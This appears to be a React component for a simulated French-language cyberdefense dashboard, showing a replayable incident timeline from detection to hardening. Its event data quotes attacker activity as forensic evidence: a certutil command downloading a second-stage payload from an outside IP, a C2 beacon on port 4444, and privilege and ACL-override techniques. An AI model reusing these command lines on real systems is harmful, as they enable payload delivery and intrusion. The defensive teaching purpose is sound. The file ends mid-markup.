import React, { useState, useEffect, useMemo } from 'react';
import {
  Clock,
  Play,
  Pause,
  RotateCcw,
  Shield,
  ShieldAlert,
  AlertTriangle,
  CheckCircle2,
  Terminal,
  Cpu,
  Network,
  Lock,
  Copy,
  Check,
  Search,
  Filter,
  Download,
  ArrowRight,
  ExternalLink,
  ChevronDown,
  ChevronUp,
  Flame,
  FileCode,
  Zap,
  TrendingUp,
  Gauge,
  ShieldCheck,
  Activity
} from 'lucide-react';
import { TabId, ThreatTimelineEvent, TimelinePhase } from '../types/cyberdefense';

interface ThreatTimelineProps {
  onRunInConsole: (command: string) => void;
  onNavigateTab?: (tab: TabId) => void;
}

const INITIAL_TIMELINE_EVENTS: ThreatTimelineEvent[] = [
  {
    id: 'evt-1',
    timeOffsetSec: 0,
    timeDisplay: '07:35:01 (T+00:00)',
    phase: 'SCAN',
    phaseLabel: '1. Scan & Ingestion des Privilèges',
    title: 'Initialisation du Scan Profond & Élévation P/Invoke Natif',
    severity: 'INFO',
    status: 'VERIFIED',
    mitreId: 'T1068',
    mitreTactic: 'Privilege Escalation',
    targetArtifact: 'ntdll.dll / SeDebugPrivilege + SeTakeOwnershipPrivilege',
    description: 'Vérification du jeton UAC (SID Administrateur S-1-5-32-544) et acquisition directe des privilèges NT SeDebug et SeTakeOwnership via P/Invoke pour contourner les verrous DACL du système.',
    evidence: '[P/Invoke] OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)\n[P/Invoke] LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid)\n[P/Invoke] AdjustTokenPrivileges(hToken, FALSE, &newState, ...) -> STATUS_SUCCESS (0x00000000)',
    remediationActionCmd: 'scan --deep',
    remediationButtonLabel: 'Relancer le Scan Kernel',
    remediationResult: 'Privilèges SeDebug et SeTakeOwnership confirmés actifs.',
    scoreDelta: 4,
    cumulativeScore: 32,
    riskReductionPercent: 5,
    riskCategory: 'Visibilité & Droits Noyau P/Invoke'
  },
  {
    id: 'evt-2',
    timeOffsetSec: 2,
    timeDisplay: '07:35:03 (T+00:02)',
    phase: 'DETECTION',
    phaseLabel: '2. Détection d\'Anomalie Comportementale',
    title: 'Téléchargement Furtif via LOLBin certutil.exe',
    severity: 'MEDIUM',
    status: 'CONTAINED',
    mitreId: 'T1105',
    mitreTactic: 'Ingress Tool Transfer (LOLBin)',
    targetArtifact: 'C:\\Windows\\System32\\certutil.exe -urlcache -split -f http://185.220.101.4/stage2.bin',
    description: 'Abus du binaire de gestion des certificats Windows pour contourner les contrôles de passerelle et télécharger un exécutable de deuxième étape en cache.',
    evidence: 'EventID: 4688 | Security Auditing\nCreator Process: cmd.exe (PID 4096)\nNew Process: certutil.exe (PID 3128)\nCommandLine: certutil.exe -urlcache -split -f http://185.220.101.4/stage2.bin %TEMP%\\svch0st_updater.exe\nHash SHA256: 8a7f1c9... [FLAGGED SUSPICIOUS]',
    remediationActionCmd: 'kill 3128',
    remediationButtonLabel: 'Tuer le Processus LOLBin',
    remediationResult: 'Processus certutil.exe interrompu et fichiers temporaires purgés.',
    scoreDelta: 13,
    cumulativeScore: 45,
    riskReductionPercent: 15,
    riskCategory: 'Neutralisation Dropper certutil.exe'
  },
  {
    id: 'evt-3',
    timeOffsetSec: 5,
    timeDisplay: '07:35:05 (T+00:05)',
    phase: 'DETECTION',
    phaseLabel: '2. Détection d\'Anomalie Comportementale',
    title: 'Canal C2 Actif & Télémétrie Balise (Port 4444)',
    severity: 'HIGH',
    status: 'CONTAINED',
    mitreId: 'T1071.001',
    mitreTactic: 'Command & Control: Web Protocols',
    targetArtifact: 'TCP 192.168.1.42:52314 -> 185.220.101.4:4444 (svch0st_updater.exe)',
    description: 'Établissement d\'une connexion sortante persistante imitant un hôte de services svchost. Balisage toutes les 5 secondes vers une infrastructure C2 identifiée en Europe de l\'Est.',
    evidence: 'Get-NetTCPConnection:\nLocalAddress: 192.168.1.42:52314\nRemoteAddress: 185.220.101.4:4444\nOwningProcess: 5824 (svch0st_updater.exe)\nState: ESTABLISHED | Transmit Rate: 1.4 KB/s beacon pulse',
    remediationActionCmd: 'sockets',
    remediationButtonLabel: 'Inspecter les Sockets C2',
    remediationResult: 'Socket 185.220.101.4:4444 neutralisé et IP bloquée via Netsh AdvFirewall.',
    scoreDelta: 15,
    cumulativeScore: 60,
    riskReductionPercent: 20,
    riskCategory: 'Rupture Canal C2 Port 4444'
  },
  {
    id: 'evt-4',
    timeOffsetSec: 8,
    timeDisplay: '07:35:08 (T+00:08)',
    phase: 'DETECTION',
    phaseLabel: '2. Détection d\'Anomalie Comportementale',
    title: 'Infiltration Noyau : Pilote Rootkit Verrouillé TrustedInstaller',
    severity: 'CRITICAL',
    status: 'DETECTED',
    mitreId: 'T1014',
    mitreTactic: 'Rootkit Hooking & Defense Evasion',
    targetArtifact: 'C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys',
    description: 'Pilote kernel non-signé interceptant IRP_MJ_CREATE pour masquer des processus malveillants. Fichier verrouillé par handle noyau et possédé exclusivement par NT SERVICE\\TrustedInstaller avec DACL en lecture seule.',
    evidence: 'fltmc filters:\nFilter Name: SysHookFlt | Altitude: 385200 | Frame: 0\nFile Attributes: READONLY | SYSTEM (0x06)\nOwner SID: S-1-5-80-956008885-3418522649-1831038044 (NT SERVICE\\TrustedInstaller)\nDACL: Deny Write to BUILTIN\\Administrators',
    remediationActionCmd: 'unlock "C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys"',
    remediationButtonLabel: 'Déclencher l\'Excision Kernel',
    remediationResult: 'Protocole d\'excision amorcé : takeown + icacls + PendingFileRenameOperations.',
    scoreDelta: 10,
    cumulativeScore: 70,
    riskReductionPercent: 12,
    riskCategory: 'Isolation Pilote Rootkit SysHookFlt'
  },
  {
    id: 'evt-5',
    timeOffsetSec: 12,
    timeDisplay: '07:35:12 (T+00:12)',
    phase: 'CONTAINMENT',
    phaseLabel: '3. Confinement & Neutralisation',
    title: 'Gel Simultané des Watchdogs Mutuels via NtSuspendProcess',
    severity: 'HIGH',
    status: 'CONTAINED',
    mitreId: 'T1562.001',
    mitreTactic: 'Defense Evasion: Impair Defenses',
    targetArtifact: 'PID 5824 (svch0st_updater.exe) & PID 5912 (watchdog_helper.exe)',
    description: 'Détection d\'une persistance mutuelle : chaque processus redémarre l\'autre s\'il est abattu. L\'API non-documentée NtSuspendProcess est invoquée simultanément sur les deux arbres pour figer tous les threads avant terminaison définitive.',
    evidence: 'NtSuspendProcess(OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, 5824)) -> STATUS_SUCCESS\nNtSuspendProcess(OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, 5912)) -> STATUS_SUCCESS\nThread states: Suspended (WaitReason: UserRequest)\ntaskkill /F /PID 5824 /T -> SUCCESS',
    remediationActionCmd: 'suspend swisyn',
    remediationButtonLabel: 'Geler les Watchdogs',
    remediationResult: 'Tous les threads congelés en RAM. Boucle de réanimation neutralisée.',
    scoreDelta: 12,
    cumulativeScore: 82,
    riskReductionPercent: 18,
    riskCategory: 'Gel RAM Watchdogs Mutuels (NtSuspend)'
  },
  {
    id: 'evt-6',
    timeOffsetSec: 18,
    timeDisplay: '07:35:18 (T+00:18)',
    phase: 'EXCISION',
    phaseLabel: '4. Excision Noyau & Dépossession ACL',
    title: 'Dépossession TrustedInstaller & Inscription Boot-Delete',
    severity: 'CRITICAL',
    status: 'REMEDIATED',
    mitreId: 'T1222.001',
    mitreTactic: 'File and Directory Permissions Modification',
    targetArtifact: 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\PendingFileRenameOperations',
    description: 'Dépossession forcée de TrustedInstaller via takeown.exe /A, attribution du Contrôle Total aux Administrateurs (icacls.exe /grant *S-1-5-32-544:F), écrasement du binaire à 0 octet et inscription dans le gestionnaire de session Windows pour suppression atomique au prochain démarrage noyau.',
    evidence: '1. Set-ItemProperty -Path $path -Name Attributes -Value Normal\n2. takeown.exe /f suspicious_kernel_hook.sys /a -> SUCCÈS\n3. icacls.exe suspicious_kernel_hook.sys /grant *S-1-5-32-544:F /c /q -> SUCCÈS\n4. [IO.File]::WriteAllBytes($path, @()) -> Fichier tronqué à 0 octet\n5. MultiString: "\\??\\C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys\\0\\0"',
    remediationActionCmd: 'unlock "C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys"',
    remediationButtonLabel: 'Vérifier le Verrou Session Manager',
    remediationResult: 'Binaire vidé. Destruction définitive programmée au prochain boot Windows.',
    scoreDelta: 12,
    cumulativeScore: 94,
    riskReductionPercent: 22,
    riskCategory: 'Excision TrustedInstaller & Boot Delete'
  },
  {
    id: 'evt-7',
    timeOffsetSec: 25,
    timeDisplay: '07:35:25 (T+00:25)',
    phase: 'HARDENING',
    phaseLabel: '5. Durcissement Post-Incident & Audit Final',
    title: 'Purge des Abonnements WMI, Neutralisation SMBv1 & Restauration Defender',
    severity: 'INFO',
    status: 'VERIFIED',
    mitreId: 'T1546.003',
    mitreTactic: 'Persistence: WMI Event Subscription',
    targetArtifact: 'root\\subscription (EventFilter) / SMB1Protocol / MpCmdRun.exe',
    description: 'Purge des consommateurs d\'événements WMI cachés dans root\\subscription, désactivation du protocole SMBv1 vulnérable aux attaques de type WannaCry/EternalBlue, re-enregistrement des DLLs de signatures cryptographiques (wintrust.dll, mssip32.dll) et validation de Windows Defender.',
    evidence: 'Get-CimInstance __EventFilter -Namespace root\\subscription | Remove-CimInstance\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart\nregsvr32.exe /s wintrust.dll mssip32.dll atl.dll\nSet-MpPreference -DisableRealtimeMonitoring $false -DisableScriptScanning $false\nSystème durci avec succès (Score de protection : 98%).',
    remediationActionCmd: 'defender-repair',
    remediationButtonLabel: 'Réparer Windows Defender',
    remediationResult: 'Tous les paramètres de sécurité restaurés à l\'état optimal.',
    scoreDelta: 4,
    cumulativeScore: 98,
    riskReductionPercent: 8,
    riskCategory: 'Durcissement WMI, SMBv1 & Defender'
  }
];

export const ThreatTimeline: React.FC<ThreatTimelineProps> = ({
  onRunInConsole,
  onNavigateTab
}) => {
  const [events, setEvents] = useState<ThreatTimelineEvent[]>(INITIAL_TIMELINE_EVENTS);
  const [selectedPhase, setSelectedPhase] = useState<string>('ALL');
  const [selectedSeverity, setSelectedSeverity] = useState<string>('ALL');
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [expandedEventId, setExpandedEventId] = useState<string | null>('evt-4');
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // Playback Simulation Mode state
  const [isPlaying, setIsPlaying] = useState<boolean>(false);
  const [currentPlaybackIndex, setCurrentPlaybackIndex] = useState<number>(-1);
  const [playbackSpeed, setPlaybackSpeed] = useState<number>(1); // 1x, 2x, 4x

  // Timer effect for playback simulation
  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (isPlaying) {
      const delay = Math.round(2400 / playbackSpeed);
      timer = setTimeout(() => {
        setCurrentPlaybackIndex(prev => {
          const next = prev + 1;
          if (next >= events.length) {
            setIsPlaying(false);
            return events.length - 1;
          }
          // auto expand current playing event
          setExpandedEventId(events[next].id);
          return next;
        });
      }, delay);
    }
    return () => clearTimeout(timer);
  }, [isPlaying, currentPlaybackIndex, playbackSpeed, events]);

  const handleStartPlayback = () => {
    if (currentPlaybackIndex >= events.length - 1) {
      setCurrentPlaybackIndex(0);
      setExpandedEventId(events[0].id);
    } else if (currentPlaybackIndex === -1) {
      setCurrentPlaybackIndex(0);
      setExpandedEventId(events[0].id);
    }
    setIsPlaying(true);
  };

  const handlePausePlayback = () => {
    setIsPlaying(false);
  };

  const handleResetPlayback = () => {
    setIsPlaying(false);
    setCurrentPlaybackIndex(-1);
    setExpandedEventId(null);
  };

  const handleStepForward = () => {
    setCurrentPlaybackIndex(prev => {
      const next = Math.min(events.length - 1, prev + 1);
      setExpandedEventId(events[next].id);
      return next;
    });
  };

  const handleStepBackward = () => {
    setCurrentPlaybackIndex(prev => {
      const next = Math.max(0, prev - 1);
      setExpandedEventId(events[next].id);
      return next;
    });
  };

  // Copy to clipboard helper
  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  // Execute remediation action and update status
  const handleExecuteRemediation = (evt: ThreatTimelineEvent) => {
    if (evt.remediationActionCmd) {
      onRunInConsole(evt.remediationActionCmd);
      setEvents(prev =>
        prev.map(item =>
          item.id === evt.id
            ? { ...item, status: 'REMEDIATED' }
            : item
        )
      );
    }
  };

  // Run full remediation pipeline
  const handleRunAllRemediations = () => {
    onRunInConsole('scan --deep');
    setTimeout(() => onRunInConsole('suspend swisyn'), 600);
    setTimeout(() => onRunInConsole('kill 3128'), 1200);
    setTimeout(() => onRunInConsole('unlock "C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys"'), 1800);
    setTimeout(() => onRunInConsole('defender-repair'), 2400);
    setTimeout(() => onRunInConsole('wmi-clean'), 3000);

    setEvents(prev =>
      prev.map(evt => ({
        ...evt,
        status: evt.phase === 'HARDENING' || evt.phase === 'SCAN' ? 'VERIFIED' : 'REMEDIATED'
      }))
    );
  };

  // Filtered events
  const filteredEvents = useMemo(() => {
    return events.filter(evt => {
      if (selectedPhase !== 'ALL' && evt.phase !== selectedPhase) {
        return false;
      }
      if (selectedSeverity !== 'ALL' && evt.severity !== selectedSeverity) {
        return false;
      }
      if (searchQuery.trim()) {
        const q = searchQuery.toLowerCase();
        const matches =
          evt.title.toLowerCase().includes(q) ||
          evt.description.toLowerCase().includes(q) ||
          (evt.mitreId && evt.mitreId.toLowerCase().includes(q)) ||
          (evt.targetArtifact && evt.targetArtifact.toLowerCase().includes(q)) ||
          (evt.evidence && evt.evidence.toLowerCase().includes(q));
        if (!matches) return false;
      }
      return true;
    });
  }, [events, selectedPhase, selectedSeverity, searchQuery]);

  // Export report as Markdown
  const handleExportMarkdown = () => {
    const lines = [
      '# RAPPORT D\'ENQUÊTE & CHRONOLOGIE DES MENACES - SPACESEC CYBERDEFENSE v3.0',
      `Date de génération : ${new Date().toISOString()}`,
      `Système : SEC-ENDPOINT-01 (Architecture Windows x64)`,
      '================================================================================',
      '',
      '## RÉSUMÉ CHRONOLOGIQUE DES INCIDENTS (DE L\'INGESTION AU DURCISSEMENT)',
      `Score de Sécurité Final : ${currentSecurityScore} / 100 pts (Risque Résiduel : ${residualRisk}%)`,
      '',
      ...events.map((e, idx) => {
        return `### Étape ${idx + 1} : [${e.severity}] ${e.title}
- **Timestamp** : ${e.timeDisplay} (Phase: ${e.phase})
- **Statut** : ${e.status}
- **Impact Score Sécurité** : +${e.scoreDelta || 0} pts (Score cumulé: ${e.cumulativeScore || 0}%)
- **Réduction du Risque** : -${e.riskReductionPercent || 0}% (${e.riskCategory || 'Général'})
- **Technique MITRE** : ${e.mitreId || 'N/A'} - ${e.mitreTactic || 'N/A'}
- **Cible Artifact** : ${e.targetArtifact || 'N/A'}
- **Description** : ${e.description}
- **Preuve Forensique** :
\`\`\`
${e.evidence}
\`\`\`
- **Action de Remédiation** : \`${e.remediationActionCmd || 'N/A'}\` (${e.remediationResult || 'Effectué'})
`;
      }),
      '',
      '## CONCLUSION FORENSIQUE & RECOMMANDATIONS :',
      '1. Redémarrer le système pour finaliser l\'excision atomique via PendingFileRenameOperations.',
      '2. Maintenir la politique PowerShell d\'interdiction des LOLBins certutil et bitsadmin.',
      '3. Surveiller les appels P/Invoke vers NtSuspendProcess et NtAdjustPrivileges.'
    ];

    const blob = new Blob([lines.join('\n')], { type: 'text/markdown;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `SpaceSec_Threat_Timeline_${Date.now()}.md`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
    onRunInConsole('export-report');
  };

  // Severity styles
  const getSeverityBadge = (severity: ThreatTimelineEvent['severity']) => {
    switch (severity) {
      case 'CRITICAL':
        return (
          <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-xs font-bold font-mono bg-rose-950/80 text-rose-400 border border-rose-800/80 shadow-sm shadow-rose-950">
            <Flame className="w-3 h-3 text-rose-400 animate-pulse" />
            CRITIQUE
          </span>
        );
      case 'HIGH':
        return (
          <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-xs font-semibold font-mono bg-orange-950/80 text-orange-400 border border-orange-800/80">
            <AlertTriangle className="w-3 h-3 text-orange-400" />
            ÉLEVÉ
          </span>
        );
      case 'MEDIUM':
        return (
          <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-xs font-medium font-mono bg-amber-950/80 text-amber-400 border border-amber-800/80">
            <AlertTriangle className="w-3 h-3 text-amber-400" />
            MOYEN
          </span>
        );
      case 'LOW':
        return (
          <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-xs font-medium font-mono bg-slate-800 text-slate-300 border border-slate-700">
            FAIBLE
          </span>
        );
      case 'INFO':
      default:
        return (
          <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-xs font-medium font-mono bg-cyan-950/80 text-cyan-400 border border-cyan-800/80">
            INFO
          </span>
        );
    }
  };

  // Status styles
  const getStatusBadge = (status: ThreatTimelineEvent['status']) => {
    switch (status) {
      case 'REMEDIATED':
        return (
          <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded text-[11px] font-semibold font-mono bg-emerald-950/80 text-emerald-400 border border-emerald-800/60">
            <CheckCircle2 className="w-3 h-3 text-emerald-400" />
            ÉRADIQUÉ / REMÉDIÉ
          </span>
        );
      case 'CONTAINED':
        return (
          <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded text-[11px] font-semibold font-mono bg-indigo-950/80 text-indigo-300 border border-indigo-800/60">
            <Lock className="w-3 h-3 text-indigo-400" />
            CONFINÉ
          </span>
        );
      case 'VERIFIED':
        return (
          <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded text-[11px] font-semibold font-mono bg-teal-950/80 text-teal-300 border border-teal-800/60">
            <Shield className="w-3 h-3 text-teal-400" />
            VÉRIFIÉ & SAIN
          </span>
        );
      case 'IN_PROGRESS':
        return (
          <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded text-[11px] font-semibold font-mono bg-cyan-950/80 text-cyan-300 border border-cyan-800/60">
            <Zap className="w-3 h-3 text-cyan-400 animate-spin" />
            EN COURS
          </span>
        );
      case 'DETECTED':
      default:
        return (
          <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded text-[11px] font-semibold font-mono bg-rose-950/80 text-rose-300 border border-rose-800/60 animate-pulse">
            <ShieldAlert className="w-3 h-3 text-rose-400" />
            DÉTECTÉ / ACTIF
          </span>
        );
    }
  };

  const getPhaseColor = (phase: TimelinePhase) => {
    switch (phase) {
      case 'SCAN':
        return {
          border: 'border-cyan-500',
          bg: 'bg-cyan-500/10',
          text: 'text-cyan-400',
          glow: 'shadow-cyan-500/20'
        };
      case 'DETECTION':
        return {
          border: 'border-rose-500',
          bg: 'bg-rose-500/10',
          text: 'text-rose-400',
          glow: 'shadow-rose-500/20'
        };
      case 'CONTAINMENT':
        return {
          border: 'border-indigo-500',
          bg: 'bg-indigo-500/10',
          text: 'text-indigo-400',
          glow: 'shadow-indigo-500/20'
        };
      case 'EXCISION':
        return {
          border: 'border-purple-500',
          bg: 'bg-purple-500/10',
          text: 'text-purple-400',
          glow: 'shadow-purple-500/20'
        };
      case 'HARDENING':
        return {
          border: 'border-emerald-500',
          bg: 'bg-emerald-500/10',
          text: 'text-emerald-400',
          glow: 'shadow-emerald-500/20'
        };
      default:
        return {
          border: 'border-slate-500',
          bg: 'bg-slate-500/10',
          text: 'text-slate-400',
          glow: 'shadow-slate-500/20'
        };
    }
  };

  // Metrics calculations
  const totalEvents = events.length;
  const criticalCount = events.filter(e => e.severity === 'CRITICAL').length;
  const remediatedCount = events.filter(e => e.status === 'REMEDIATED' || e.status === 'VERIFIED').length;
  const remediationPercentage = Math.round((remediatedCount / totalEvents) * 100);

  // Dynamic Security Score Calculation
  const baseScore = 28;
  const earnedScore = events
    .filter(e => e.status === 'REMEDIATED' || e.status === 'VERIFIED')
    .reduce((acc, curr) => acc + (curr.scoreDelta || 0), 0);
  const currentSecurityScore = Math.min(100, baseScore + earnedScore);
  const residualRisk = Math.max(0, 100 - currentSecurityScore);

  return (
    <div className="space-y-6">
      {/* Header Banner */}
      <div className="p-6 md:p-8 bg-gradient-to-r from-slate-900 via-slate-900 to-slate-950 border border-slate-800 rounded-2xl relative overflow-hidden shadow-2xl">
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6">
          <div className="space-y-2 max-w-3xl">
            <div className="inline-flex items-center gap-2 px-3 py-1 bg-cyan-950/80 border border-cyan-800/60 rounded-full text-cyan-300 font-mono text-xs font-semibold">
              <Clock className="w-3.5 h-3.5 text-cyan-400" />
              <span>CHRONOLOGIE FORENSIQUE DE BOUT-EN-BOUT</span>
            </div>

            <h1 className="text-2xl md:text-3xl font-extrabold text-white tracking-tight font-['Plus_Jakarta_Sans']">
              Chronologie Visuelle des Incidents & Séquence d'Éradication
            </h1>

            <p className="text-sm text-slate-300 leading-relaxed">
              Visualisez le cycle de vie complet de l'attaque et de la remédiation : de l'ingestion initiale du scan système
              à l'excision racine du pilote <strong className="text-cyan-300">TrustedInstaller</strong>, la suspension des
              watchdogs en RAM et le durcissement final de l'OS.
            </p>
          </div>

          {/* Quick Action Buttons */}
          <div className="flex flex-wrap items-center gap-3 shrink-0">
            <button
              onClick={handleRunAllRemediations}
              className="flex items-center gap-2 px-4 py-2.5 bg-rose-600 hover:bg-rose-500 text-white font-bold rounded-lg text-xs transition-colors shadow-lg shadow-rose-950"
            >
              <Zap className="w-4 h-4" />
              <span>Exécuter Toute la Séquence de Remédiation</span>
            </button>

            <button
              onClick={handleExportMarkdown}
              className="flex items-center gap-2 px-4 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-200 font-semibold rounded-lg text-xs transition-colors border border-slate-700"
            >
              <Download className="w-4 h-4 text-cyan-400" />
              <span>Exporter le Rapport (.md)</span>
            </button>
          </div>
        </div>

        {/* Dynamic Security Score Evolution & Risk Reduction Gauge */}
        <div className="mt-6 pt-6 border-t border-slate-800/80 space-y-3">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
            <div className="flex items-center gap-2">
              <Gauge className="w-4 h-4 text-cyan-400" />
              <span className="text-xs font-bold text-white tracking-tight">
                Score de Sécurité Global & Réduction du Risque Système
              </span>
              <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold ${
                currentSecurityScore >= 90
                  ? 'bg-emerald-950 text-emerald-300 border border-emerald-800'
                  : currentSecurityScore >= 70
                  ? 'bg-cyan-950 text-cyan-300 border border-cyan-800'
                  : currentSecurityScore >= 50
                  ? 'bg-amber-950 text-amber-300 border border-amber-800'
                  : 'bg-rose-950 text-rose-300 border border-rose-800'
              }`}>
                {currentSecurityScore >= 90
                  ? 'SYSTÈME HAUTEMENT DURCI'
                  : currentSecurityScore >= 70
                  ? 'MENACES MAJEURES NEUTRALISÉES'
                  : currentSecurityScore >= 50
                  ? 'CONFINEMENT EN COURS'
                  : 'RISQUE CRITIQUE ACTIF'}
              </span>
            </div>

            <div className="flex items-center gap-3 text-xs font-mono">
              <span className="text-slate-400">
                Score Actuel : <strong className="text-2xl text-emerald-400 font-extrabold">{currentSecurityScore}</strong>
                <span className="text-slate-500 text-sm"> / 100 pts</span>
              </span>
              <span className="text-slate-600">|</span>
              <span className="text-rose-400">
                Risque Résiduel : <strong className="text-white">{residualRisk}%</strong>
              </span>
            </div>
          </div>

          {/* Interactive Multi-segment Progress Bar */}
          <div className="space-y-1.5">
            <div className="h-3 w-full bg-slate-950 rounded-full border border-slate-800 overflow-hidden relative p-0.5">
              <div
                style={{ width: `${currentSecurityScore}%` }}
                className={`h-full rounded-full transition-all duration-700 bg-gradient-to-r ${
                  currentSecurityScore >= 90
                    ? 'from-amber-500 via-cyan-500 to-emerald-400'
                    : currentSecurityScore >= 60
                    ? 'from-rose-500 via-amber-500 to-cyan-400'
                    : 'from-rose-600 to-rose-400'
                }`}
              />
            </div>

            <div className="flex items-center justify-between text-[11px] font-mono text-slate-400">
              <div className="flex items-center gap-1.5">
                <TrendingUp className="w-3.5 h-3.5 text-emerald-400" />
                <span>Gain de protection : <strong className="text-emerald-300">+{currentSecurityScore - baseScore} pts</strong> depuis le scan initial (Base: {baseScore}%)</span>
              </div>
              <div className="flex items-center gap-1">
                <span>Objectif de conformité : <strong className="text-cyan-300">98% Hardened</strong></span>
              </div>
            </div>
          </div>
        </div>

        {/* Live Metrics Row */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 mt-4 pt-4 border-t border-slate-800/80">
          <div className="space-y-1">
            <span className="text-xs text-slate-400">Total Événements</span>
            <div className="text-2xl font-bold text-white font-mono">{totalEvents} Jalons</div>
            <span className="text-[11px] text-slate-500">Scan initial → Durcissement</span>
          </div>

          <div className="space-y-1">
            <span className="text-xs text-slate-400">Menaces Critiques</span>
            <div className="text-2xl font-bold text-rose-400 font-mono">{criticalCount} Infiltrations</div>
            <span className="text-[11px] text-slate-500">Rootkit Kernel & C2 Beacon</span>
          </div>

          <div className="space-y-1">
            <span className="text-xs text-slate-400">Taux de Remédiation</span>
            <div className="text-2xl font-bold text-emerald-400 font-mono">{remediationPercentage}%</div>
            <span className="text-[11px] text-slate-500">{remediatedCount} sur {totalEvents} étapes sécurisées</span>
          </div>

          <div className="space-y-1">
            <span className="text-xs text-slate-400">Durée Totale Incident</span>
            <div className="text-2xl font-bold text-cyan-400 font-mono">00:25 sec</div>
            <span className="text-[11px] text-slate-500">Temps moyen de neutralisation</span>
          </div>
        </div>
      </div>

      {/* Interactive Simulation & Filter Controls Bar */}
      <div className="p-4 bg-slate-900 border border-slate-800 rounded-xl space-y-4">
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
          {/* Timeline Playback Player */}
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-xs font-semibold text-slate-300 flex items-center gap-1.5 mr-2">
              <Clock className="w-3.5 h-3.5 text-cyan-400" />
              Rejeu Temporel :
            </span>

            {!isPlaying ? (
              <button
                onClick={handleStartPlayback}
                className="flex items-center gap-1.5 px-3 py-1.5 bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold rounded text-xs transition-colors shadow-sm"
              >
                <Play className="w-3 h-3 fill-current" />
                <span>Rejouer la Chronologie</span>
              </button>
            ) : (
              <button
                onClick={handlePausePlayback}
                className="flex items-center gap-1.5 px-3 py-1.5 bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold rounded text-xs transition-colors shadow-sm"
              >
                <Pause className="w-3 h-3 fill-current" />
                <span>Pause</span>
              </button>
            )}

            <button
              onClick={handleStepBackward}
              disabled={currentPlaybackIndex <= 0}
              className="px-2.5 py-1.5 bg-slate-800 hover:bg-slate-700 disabled:opacity-40 text-slate-200 rounded text-xs font-mono transition-colors"
              title="Étape précédente"
            >
              ◀ Préc.
            </button>

            <button
              onClick={handleStepForward}
              disabled={currentPlaybackIndex >= events.length - 1}
              className="px-2.5 py-1.5 bg-slate-800 hover:bg-slate-700 disabled:opacity-40 text-slate-200 rounded text-xs font-mono transition-colors"
              title="Étape suivante"
            >
              Suiv. ▶
            </button>

            <button
              onClick={handleResetPlayback}
              className="p-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded text-xs transition-colors"
              title="Réinitialiser"
            >
              <RotateCcw className="w-3.5 h-3.5" />
            </button>

            {/* Playback speed selector */}
            <div className="flex items-center gap-1 bg-slate-950 border border-slate-800 p-0.5 rounded text-xs font-mono ml-2">
              {[1, 2, 4].map(speed => (
                <button
                  key={speed}
                  onClick={() => setPlaybackSpeed(speed)}
                  className={`px-2 py-0.5 rounded text-[11px] ${
                    playbackSpeed === speed
                      ? 'bg-cyan-950 text-cyan-300 font-bold border border-cyan-800/80'
                      : 'text-slate-400 hover:text-slate-200'
                  }`}
                >
                  {speed}x
                </button>
              ))}
            </div>

            {currentPlaybackIndex >= 0 && (
              <span className="text-xs font-mono text-cyan-400 ml-2 animate-pulse">
                [Jalon {currentPlaybackIndex + 1}/{events.length} : {events[currentPlaybackIndex]?.timeDisplay}]
              </span>
            )}
          </div>

          {/* Search Box */}
          <div className="relative min-w-[240px]">
            <Search className="w-3.5 h-3.5 absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
            <input
              type="text"
              placeholder="Filtrer (MITRE, IP, fichier, PID)..."
              value={searchQuery}
              onChange={e => setSearchQuery(e.target.value)}
              className="w-full bg-slate-950 border border-slate-800 rounded-lg pl-9 pr-3 py-1.5 text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-cyan-500 font-mono"
            />
          </div>
        </div>

        {/* Phase Filter Tabs */}
        <div className="flex items-center gap-2 overflow-x-auto pb-1 pt-2 border-t border-slate-800/60 text-xs">
          <span className="text-slate-400 font-medium shrink-0 flex items-center gap-1 mr-1">
            <Filter className="w-3 h-3 text-cyan-400" /> Phase :
          </span>

          {[
            { id: 'ALL', label: 'Toutes les Phases' },
            { id: 'SCAN', label: '1. Scan & Ingestion' },
            { id: 'DETECTION', label: '2. Détection d\'Anomalies' },
            { id: 'CONTAINMENT', label: '3. Confinement' },
            { id: 'EXCISION', label: '4. Excision Noyau' },
            { id: 'HARDENING', label: '5. Durcissement' }
          ].map(phase => (
            <button
              key={phase.id}
              onClick={() => setSelectedPhase(phase.id)}
